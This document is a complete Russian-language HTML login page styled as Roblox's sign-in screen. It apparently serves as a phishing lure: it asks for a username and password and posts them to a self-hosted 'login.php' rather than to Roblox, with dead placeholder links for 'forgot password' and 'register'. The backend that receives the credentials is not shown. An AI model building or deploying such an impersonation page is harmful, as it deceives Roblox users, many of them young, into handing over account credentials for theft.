<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox — Вход</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #1a1a2e;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-image: radial-gradient(circle at 20% 30%, #2a2a4a, #0f0f1f);
        }
        .card {
            background: #2a2a44;
            padding: 40px 35px;
            border-radius: 24px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
            width: 360px;
            text-align: center;
            border: 1px solid #3a3a5a;
        }
        .card h1 {
            font-size: 32px;
            font-weight: 800;
            color: #fff;
            letter-spacing: 1px;
            margin-bottom: 8px;
        }
        .card .sub {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 24px;
        }
        .card input {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0;
            border-radius: 12px;
            border: none;
            background: #1e1e32;
            color: #fff;
            font-size: 15px;
            outline: 1px solid #3a3a5a;
            transition: 0.2s;
        }
        .card input:focus {
            outline: 2px solid #00a2ff;
            background: #252540;
        }
        .card button {
            width: 100%;
            padding: 14px;
            margin-top: 16px;
            background: #00a2ff;
            border: none;
            border-radius: 12px;
            color: #fff;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: 0.2s;
        }
        .card button:hover {
            background: #0088dd;
            transform: scale(1.02);
        }
        .card .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #666;
        }
        .card .footer a {
            color: #888;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="card">
        <h1>Roblox</h1>
        <div class="sub">Войдите в свой аккаунт</div>
        <form method="POST" action="login.php">
            <input type="text" name="username" placeholder="Имя пользователя" required>
            <input type="password" name="password" placeholder="Пароль" required>
            <button type="submit">Войти</button>
        </form>
        <div class="footer">
            <a href="#">Забыли пароль?</a> • <a href="#">Регистрация</a>
        </div>
    </div>
</body>
</html>
